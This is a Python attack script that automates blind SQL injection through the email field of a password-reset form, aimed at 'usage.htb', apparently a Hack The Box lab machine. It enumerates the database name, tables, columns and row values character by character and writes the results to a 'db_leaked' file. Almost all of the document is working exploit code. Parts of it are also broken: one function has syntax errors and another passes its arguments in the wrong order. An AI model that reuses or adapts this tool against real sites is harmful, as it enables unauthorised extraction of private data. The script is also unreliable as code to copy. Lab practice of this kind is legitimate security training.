#!/bin/python3
import signal, requests, argparse, re, sys, string, time

def Ctrl_z(sig,frame):
        print("\n\n\033[1;33;40mProccess Interrupted.\n\n\033 \033[1;37;40m")
        sys.exit(0)

signal.signal(signal.SIGINT, Ctrl_z)

def banner():
        print('\033[1;32;40m  =======  \033 ||   || \033  \033  \033  =======  \033 \033 ||       \033 \033 ||       \033  \033 =======     \033  \033    ==     \033  \033    =======  \033  \033 ||   //    \033  \033   =====      \033  \033[1;37;40m')
        print('\033[1;32;40m ((        \033 ||   || \033  \033  \033        )) \033 \033 ||       \033 \033 ||      \033  \033 ||      ))   \033  \033  //||     \033  \033  ((         \033  \033 ||  //     \033  \033 ||  // ||    \033  \033[1;37;40m')
        print('\033[1;32;40m ((        \033 ||   || \033  \033  \033        )) \033 \033 ||       \033 \033 ||      \033  \033 ||       ))  \033  \033 // ||     \033  \033  ((         \033  \033 || //      \033  \033 ||  // ||    \033  \033[1;37;40m')
        print('\033[1;32;40m   =====   \033  )===(  \033  \033  \033   ====    \033 \033 ||       \033 \033 ||      \033  \033 ||      ))   \033  \033    ||     \033  \033  ((         \033  \033 ||((       \033  \033 ||  // ||    \033  \033[1;37;40m')
        print('\033[1;32;40m        )) \033 ||   || \033  \033  \033        )) \033 \033 ||       \033 \033 ||      \033  \033  =====((     \033  \033    ||     \033  \033  ((         \033  \033 || \\\\      \033  \033 || //  ||  \033  \033[1;37;40m')
        print('\033[1;32;40m        )) \033 ||   || \033  \033  \033        )) \033 \033 ||       \033 \033 ||      \033  \033 ||     \\\   \033  \033     ||     \033  \033  ((        \033  \033  ||  \\\\     \033  \033 || //  || \033  \033[1;37;40m')
        print('\033[1;32;40m  =======  \033 ||   || \033  \033  \033  =======  \033 \033  ======= \033 \033  =======\033  \033 ||      \\\  \033  \033  ========  \033  \033    ======= \033  \033  ||   \\\\    \033  \033   =====   \033  \033[1;37;40m')

def payload_Build(injection):
        payload = email + injection

        return {"_token":f"{token}", "email":f"{payload}"}

def db_Length_name():
        length = 0
        print("\n\n\033[1;37;40mEnumerating DB Name Length...\033")

        while True:
                data = payload_Build(f"' and length(database())={length}#")
                if f"We have e-mailed your password reset link to {email}" in request(url, data, cookie):
                        break

                else:
                        length = length + 1

        return length

def db_Name():
        i = 1
        end = (db_Length_name() + 1)
        print("\n\n\033[1;33;40mExtracting DB Name....\033 ")

        while i < end:
                for char in lowers:
                        data = payload_Build(f"' and substr(database(),{i},1)='{char}'#")
                        if f"We have e-mailed your password reset link to {email}" in request(url, data, cookie):
                                global dbName
                                dbName = dbName + char
                                break
                i = i + 1

def db_Name_save(dbName):
        f = open("db_leaked","a")
        f.write("\033[1;31;40m -----" * int(len(dbName)/2) + "\033\n")
        f.write("\033[1;31;40m|\033" + "  " * int((len(dbName)/2)) + f"\033[1;33;40m{dbName}" + "  " * int(len(dbName)/2) + "\033[1;31;40m|\033\n")
        f.write("\033[1;31;40m -----" * int(len(dbName)/2) + "\033 \033[1;37;40m\n")
        f.close()

def db_Name_write(dbName):
        f = open("db_leaked","w")
        f.write("\033[1;31;40m -----" * int(len(dbName)/2) + "\033\n")
        f.write("\033[1;31;40m|\033" + "  " * int((len(dbName)/2)) + f"\033[1;33;40m{dbName}" + "  " * int(len(dbName)/2) + "\033[1;31;40m|\033\n")
        f.write("\033[1;31;40m -----" * int(len(dbName)/2) + "\033 \033[1;37;40m\n")
        f.close()

def db_Name_display(dbName):
        print("\033[1;31;40m -----" * int(len(dbName)/2) + "\033")
        print("\033[1;31;40m|\033" + "  " * int((len(dbName)/2)) + f"\033[1;33;40m{dbName}" + "  " * int(len(dbName)/2) + "\033[1;31;40m|\033")
        print("\033[1;31;40m -----" * int(len(dbName)/2) + "\033 \033[1;37;40m")

# Nombres de tablas
def tables_Name(dbName):
        tablesList = tables_Length(dbName=dbName)
        index = 0
        tableNumber = 1
        print("\n\033[1;33;40mExtracting Tables Names....\033")

        while tableNumber < len(tablesList):
                tableNamePosition = 1
                tmp_name = ''
                # Mientras la posicion del number de la tabla < lista de tablas en una posicion determinada.
                while tableNamePosition <= tablesList[index]:
                        for char in lowers:
                                data = payload_Build(f"' and substr((select table_name from information_schema.tables where table_schema='{dbName}' limit {tableNumber},1),{tableNamePosition},1)='{char}'#")
                                if f"We have e-mailed your password reset link to {email}" in request(url, data, cookie):
                                        tmp_name = tmp_name + char
                                        break

                        tableNamePosition = tableNamePosition + 1

                index = index + 1
                tableNumber = tableNumber + 1
                tables.append(tmp_name)

def tables_Length(dbName):
        total = total_Tables(dbName=dbName)
        print("\n\n\033[1;37;40mEnumerating tables lengths\033")
        length = 1
        tableNumber = 1
        tablesLengths = []

        while tableNumber < (total + 1):
                for length in range (32):
                        data = payload_Build(f"' and length(substr((select table_name from information_schema.tables where table_schema='{dbName}' limit {tableNumber},1),1))={length}#")
                        if f"We have e-mailed your password reset link to {email}" in request(url, data, cookie):
                                tablesLengths.append(length)
                                break

                tableNumber = tableNumber + 1

        return tablesLengths

def total_Tables(dbName):
        total = 0
        time.sleep(1)
        print("\n\n\033[1;37;40mEnumerating total tables in DB\033")

        # Comprueba si el numero de tablas en una tabla es 0. Si es el caso, tarmina el script. Por el contrario, pasa a determinar el numero de tablas en la BD
        if "Email address does not match in our records!" in request(url, (email+f"' and (select count(table_name) from information_schema.tables where table_schema='{dbName}')=0#"), cookie):
                return "Database has no tables."
                sys.exit(0)
        else:
                while True:
                        data = payload_Build(f"' and (select count(table_name) from information_schema.tables where table_schema='{dbName}')={total}#")
                        if f'We have e-mailed your password reset link to {email}' in request(url, data, cookie):
                                break
                        else:
                                total = total + 1
        return total

def tables_Name_save():
        # Formato de impresion de tablas
        f = open("db_leaked", "a")
        index = 0
        largest = len(tables[index])
        for i in tables:
                if largest > len(tables[index]):
                        largest = len(tables[index])
                index = index + 1

        f.write("\033[1;31;40m -----" * int(index/2) + "\033\n")
        for i in tables:
                f.write("\033[1;31;40m|\033" + " " * int(index/2) + "\033[1;33;40m " + i + "\n")

        f.write("\033[1;31;40m -----" * int(index/2) + "\033 \033[1;37;40m\n")
        f.close()

def tables_Name_write():
        # Formato de impresion de tablas
        f = open("db_leaked", "w")
        index = 0
        largest = len(tables[index])
        for i in tables:
                if largest > len(tables[index]):
                        largest = len(tables[index])
                index = index + 1

        f.write("\033[1;31;40m -----" * int(index/2) + "\033\n")
        for i in tables:
                f.write("\033[1;31;40m|\033" + " " * int(index/2) + "\033[1;33;40m " + i + "\n")

        f.write("\033[1;31;40m -----" * int(index/2) + "\033 \033[1;37;40m\n")
        f.close()

def tables_Name_display():
        index = 0
        largest = len(tables[index])
        for i in tables:
                if largest > len(tables[index]):
                        largest = len(tables[index])
                index = index + 1

        print("\033[1;31;40m -----" * int(index/2) + "\033")
        for i in tables:
                print("\033[1;31;40m|\033" + " " * int(index/2) + "\033[1;33;40m " + i)

        print("\033[1;31;40m -----" * int(index/2) + "\033 \033[1;37;40m")

# Nombres de columnas
def columns_Name(dbName, tableName):
        # lenths es un diccionario con listas como sus valores.
        lengths = dict(columns_Length(dbName=dbName, tableName=tableName))
        print("\n\n\033[1;37;40mColumns Lengths: \n" + str(lengths))
        print("\n\n\033[1;37;40mExtracting Columns Names...\033")

        # Formato de diccionario: {"Table Name": [Colength1,Colength2,Colength3], "Table Name 2":[ColLength1,Colength2,Colength3],...}
        global tables_columns
        tables_columns.update({f"{tableName}":[]})

        columnNumber = 1
        index = 0
        while columnNumber < (len(lengths[tableName]) + 1): # Recorrido de diccionario con nombres de tablas y longitudes de cada columna creada.
                columnNamePosition = 1
                tmp_name = ''
                while columnNamePosition < (lengths[tableName][index] + 1): # Recorrido de la lista con longitudes de columnas dentro del diccionario
                        for char in lowers:
                                data = payload_Build(f"' and substr((select column_name from information_schema.columns where table_schema='{dbName}' and table_name='{tableName}' limit {columnNumber},1),{columnNamePosition},1)='{char}'#")
                                if f"We have e-mailed your password reset link to {email}" in request(url, data, cookie):
                                        tmp_name = tmp_name + char
                                        break

                        columnNamePosition += 1
                index += 1
                columnNumber += 1
                tables_columns[f"{tableName}"].append(tmp_name)

def total_Columns(dbName, tableName):
        time.sleep(1)
        # Diccionario con formato {"Nombre tabla": total de columnas}
        table_Columns_number = {}
        print("\n\n\033[1;37;40mEnumerating Total Columns...\033")
        if "Email address does not match in our records!" in request(url, (email+f"' and (select count(column_name) from information_schema.columns where table_schema='{dbName}' and table_name='{tableName}')=0#"), cookie):
                return f"Table {tableName} has no columns."

        total = 1
        while True:
                # Comprueba si el numero de columnas en una tabla es 0. Si es el caso, salta a la siguiente tabla. Por el contrario, pasa a determinar el numero de columnas en la tabla
                data = payload_Build(f"' and (select count(column_name) from information_schema.columns where table_schema='{dbName}' and table_name='{tableName}')={total}#")
                if f"We have e-mailed your password reset link to {email}" in request(url, data, cookie):
                        table_Columns_number.update({f"{tableName}": total})
                        break

                total = total + 1
        return table_Columns_number

def columns_Length(dbName, tableName):
        # Copia de diccionario creado con numbero de columnas en cada tabla. Recorrido del diccionario. 
        #Formato {"Nombre tabla": total de columnas}
        table_Columns_number = dict(total_Columns(dbName=dbName, tableName=tableName))
        print("\n\n\033[1;37;40mTotal Columns:\033 \n" + str(table_Columns_number))
        print("\n\n\033[1;37;40mEnumerating Columns Names Length...\033")
        # Lista dentro del diccionario; las lista continen la longitud de los nombres de columnas.
        #Formato {"Table Name": [length,length2,length3,...]}
        columns_length = {f"{tableName}":[]}
        # Diccionario table_Columns_number tiene el formatio {"Nombre tabla": [column, column2, column3]}.
        columns = 1
        columnNumber = 1
        while columns < table_Columns_number[f"{tableName}"] + 1: # Recorrido de lista en direcctorio
                while columnNumber < (int(columns) + 1):
                        length = 0
                        while length < 32: # longitud maxima 32.
                                # Interesados en saber la longitud de cada columna dentro de la tabla
                                data = payload_Build(f"' and length(substr((select column_name from information_schema.columns where table_schema='{dbName}' and table_name='{tableName}' limit {columnNumber},1),1))={length}#")
                                if f"We have e-mailed your password reset link to {email}" in request(url, data, cookie):
                                        columns_length[f"{tableName}"].append(length)
                                        break

                                length += 1
                        columnNumber += 1
                columns +=1
        print("\n" + str(columns_length))
        return columns_length

def columns_Name_save():
        f = open("db_leaked","a")
        largest = 0
        largesTables = 0
        index = ''
        indexTables = 0
        for tables,columns in tables_columns.items():
                if largesTables < len(tables):
                        largesTables = len(tables)
                        indexTables += 1

                if largest < len(columns):
                        largest = len(columns)
                        index = tables

        f.write("\033[1;31;40m ---"  * largesTables + " ---" * len(tables_columns[index]) + "\033\n")
        for tables, columns in tables_columns.items():
                f.write("\033[1;31;40m|\033" + " " * int(indexTables/2) + "\033[1;33;40m " + tables + "\n")
                f.write("\033[1;31;40m ---" * largesTables + " ---" * len(tables_columns[index]) + "\033\n")
                f.write("\033[1;31;40m|\033" + "\033[1;36;40m" + str(columns) + "\n")
                f.write("\033[1;31;40m ---" * largesTables + " ---" * len(tables_columns[index]) + "\033\n")
        f.close()


def columns_Name_write():
        f = open("db_leaked","w")
        largest = 0
        largesTables = 0
        index = ''
        indexTables = 0
        for tables,columns in tables_columns.items():
                if largesTables < len(tables):
                        largesTables = len(tables)
                        indexTables += 1

                if largest < len(columns):
                        largest = len(columns)
                        index = tables

        f.write("\033[1;31;40m ---"  * largesTables + " ---" * len(tables_columns[index]) + "\033\n")
        for tables, columns in tables_columns.items():
                f.write("\033[1;31;40m|\033" + " " * int(indexTables/2) + "\033[1;33;40m " + tables + "\n")
                f.write("\033[1;31;40m ---" * largesTables + " ---" * len(tables_columns[index]) + "\033\n")
                f.write("\033[1;31;40m|\033" + "\033[1;36;40m" + str(columns) + "\n")
                f.write("\033[1;31;40m ---" * largesTables + " ---" * len(tables_columns[index]) + "\033\n")
        f.close()

def columns_Name_display():
        largest = 0
        largesTables = 0
        index = ''
        indexTables = 0
        for tables,columns in tables_columns.items():
                if largesTables < len(tables):
                        largesTables = len(tables)
                        indexTables += 1

                if largest < len(columns):
                        largest = len(columns)
                        index = tables

        print("\033[1;31;40m ---"  * largesTables + " ---" * len(tables_columns[index]) + "\033\n")
        for tables, columns in tables_columns.items():
                print("\033[1;31;40m|\033" + " " * int(indexTables/2) + "\033[1;33;40m " + tables)
                print("\033[1;31;40m ---" * largesTables + " ---" * len(tables_columns[index]) + "\033")
                print("\033[1;31;40m|\033" + "\033[1;36;40m" + str(columns))
                print("\033[1;31;40m ---" * largesTables + " ---" * len(tables_columns[index]) + "\033")

# Registros
def total_Registers_range():
        char = input("\033[1;37;40mUse range for total registers injection? [Y/n]:\033 \033[1;32;40m ")
        if 'Y' in char.upper():
                try:
                        min,max = input("\033[1;37;40mRange [min,max]:\033 \033[1;32;40m ").split(",")
                        tableName = input("\033[1;37;40mTable Name:\033 \033[1;32;40m ")
                        while (min != '') and (max != ''):
                                data = payload_Build(f"' and (select count(*) from {tableName})>{min} and (select count(*) from {tableName})<{max}#")
                                if f"We have e-mailed your password reset link to {email}" in request(url, data, cookie):
                                        print("\033[1;37;40mClose, reduce your range...\033")
                                        char = input("\033[1;37;40mUse another range for total registers injection? [Y/n]:\033 \033[1;32;40m ")
                                        if 'n' in char.lower():
                                                return

                                        min,max = input("\033[1;37;40mRange [min,max]:\033 \033[1;32;40m ").split(",")
                                else:
                                        print("\033[1;37;40mEither min or max is wrong.\033")
                                        char = input("\033[1;37;40mUse another range for total registers injection? [Y/n]:\033 \033[1;32;40m ")
                                        if 'n' in char.lower():
                                                return

                                        min,max = input("\033[1;37;40mRange [min,max]:\033 \033[1;32;40m ").split(",")
                except:
                        pass
        else:
                return

def registers_Values(tableName, columnName, registrationNumber):
        length = registers_Lengths(tableName=tableName, columnName=columnName, registrationNumber=registrationNumber)
        print("\n\n\033[1;37;40mExtracting Registration...\033")
        columnNamePosition = 1
        letters = string.ascii_letters + "_" + string.digits + "!#$%&'()*+,-./:;?@[\]^`{|}~"
        value = ""
        while columnNamePosition < (length + 1):
                for char in  letters:
                        data = payload_Build(f"' and substr((select {columnName} from {tableName} limit {registrationNumber}),{columnNamePosition},1)='{char}'#")
                        if f"We have e-mailed your password reset link to {email}" in request(data, url, cookie):
                                value = value + char
                                break

                columnNamePosition += 1
        print("\n\n" + value)

def registers_Lengths(tableName, columnName, registrationNumber):
        time.sleep(1)
        # Uso del total de registros.
        print("\n\n\033[1;37;40mEnumerating Registration Length...\033")
        length = 0
        data = payload_Build(f"' and length(substr((select {columnName} from {tableName} limit 1),{registrationNumber}))={length}#"):
        if f"Email address does not match in our records! " in request(url, data, cookie)):
                return "\t\t\033[1;31;40mNo values registered...\033"

        while True:
                data = payload_Build(f"' and length(substr((select {columnName} from {tableName} limit 1),{registrationNumber}))={length}#")
                if f"We have e-mailed your password reset link to {email}" in request(url, data, cookie):
                        break

                length += 1
        return length

def request(url, data, cookie):
        return requests.post(url, data=data, cookies=cookie, headers={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"}).text

def menu():
        print("")
        print("\033[1;37;40m1. DB Name.\033")
        print("\033[1;37;40m2. DB Tables.\033")
        print("\033[1;37;40m3. DB Columns.\033")
        print("\033[1;37;40m4. DB Registers.\033")
        print("\033[1;37;40m5. Save Injection Extraction.\033")
        print("\033[1;37;40m6. Banner.\033")
        print("\033[1;37;40m7. Exit. (Or press CTL+C)\033")
        return int(input("\n?> \033[1;32;40m"))

def get_Cookies():
        global token
        for i in re.findall("value=\"([a-zA-Z0-9]+)", requests.get("http://usage.htb/registration").text):
                token += i

if __name__ == '__main__':
        banner()

        # Parametros web generales
        url = 'http://usage.htb/forget-password'
        token = ""
        #cookies = {"token": "", "email":"", "xsrf_token": "laravel_session_v", "":""}

        token = "" # ADD Token value
        email = "" # ADD the email you registered.
        xsrf_token = "" # Add XSRF_TOKEN value
        laravel_session_v = "" # ADD LARAVEL SESSION values
        cookie = {"Cookie": f"XSRF-TOKEN={xsrf_token}; laravel_session={laravel_session_v}"}

        # Variables globales
        lowers = string.ascii_lowercase + '_'
        dbName = ""
        tables = []
        tables_columns = {}

        while True:
                try:
                        opc = menu()
                        if opc == 1:
                                # Nombre de base de datos
                                db_Name()
                                db_Name_display(dbName)
                                continue

                        if opc == 2:
                                answer = input("\033[1;37;40mDo you know DB name? [Y/n]:\033 \033[1;32;40m ")

                                if 'Y' == answer.upper():
                                        dbName = input("\033[1;37;40mDB Name: \033[1;32;40m")
                                        if dbName == "":
                                                print("\t\t\033[1;31;40mNo DB name was received.\033")
                                                time.sleep(1)
                                                continue
                                        else:
                                                # Nombres de tablas
                                                tables_Name(dbName)
                                                tables_Name_display()
                                                continue
                                else:
                                        print("\t\t\033[1;31;40mYou need to extract DB name first.\033")
                                        time.sleep(1)
                                        continue

                        if opc == 3:
                                answer = input("\033[1;37;40mDo you know DB name and at least a table name? [Y/n]:\033 \033[1;32;40m ")

                                if 'Y' == answer.upper():
                                        dbName = input("\033[1;37;40mDB Name:\033 \033[1;32;40m ")
                                        tableName = input("\033[1;37;40mTable Name:\033 \033[1;32;40m ")
                                        if dbName == "" or tableName == "":
                                                print("\t\t\033[1;31;40mEither DB and table name was not provided.\033")
                                                time.sleep(1)
                                                continue
                                        else:
                                                # Nombres de columnas
                                                columns_Name(dbName, tableName)
                                                columns_Name_display()
                                                continue
                                else:
                                        print("\t\t\033[1;31;40mYou need to extract either DB or tables name first.\033")
                                        time.sleep(1)
                                        continue

                        if opc == 4:
                                # Registers
                                print("\033[1;37;40mYou need to determine total of registration, as it might very in a long way for each column and table, let's use ranges.\033")
                                total_Registers_range()
                                print("\033[1;37;40mAt this point you should know total registration for the table of interest.\033")
                                try:
                                        tableName = input("\033[1;37;40mTable Name:\033 \033[1;32;40m ")
                                        columnName = input("\033[1;37;40mColumn Name:\033 \033[1;32;40m ")
                                        registrationNumber = int(input("\033[1;37;40mRegistration Number:\033 \033[1;32;40m "))
                                        if tableName == "" or columnName == "" or registrationNumber == "":
                                                print("\t\t\033[1;31;40mNeed all three values...\033")
                                                time.sleep(1)
                                                continue

                                        registers_Values(tableName, columnName, registrationNumber)
                                        continue
                                except ValueError:
                                        print("\t\t\033[1;31;40mNeed all three values...\033")
                                        continue

                        if opc == 5:
                                if bool(dbName) == False:
                                        print("\t\t\033[1;31;40mDB Name hasn't been extracted yet.\033")
                                        time.sleep(1)
                                        continue

                                if bool(tables) == False:
                                        print("\t\t\033[1;31;40mTables haven't been extracted yet.\033")
                                        time.sleep(1)
                                        continue

                                if bool(tables_columns) == False:
                                        print("\t\t\033[1;31;40mColumns haven't been extracted yet.\033")
                                        time.sleep(1)
                                        continue

                                db_Name_save(dbName)
                                tables_Name_save()
                                columns_Name_save()
                                continue

                        if opc == 6:
                                banner()
                                continue

                        if opc != 1 or opc != 6:
                                print("\n\n\033[1;34;40mSee ya...\033")
                                time.sleep(1)
                                sys.exit(0)
                except(ValueError):
                        print("\t\t\033[1;31;40mOnly Numbers!!\033")
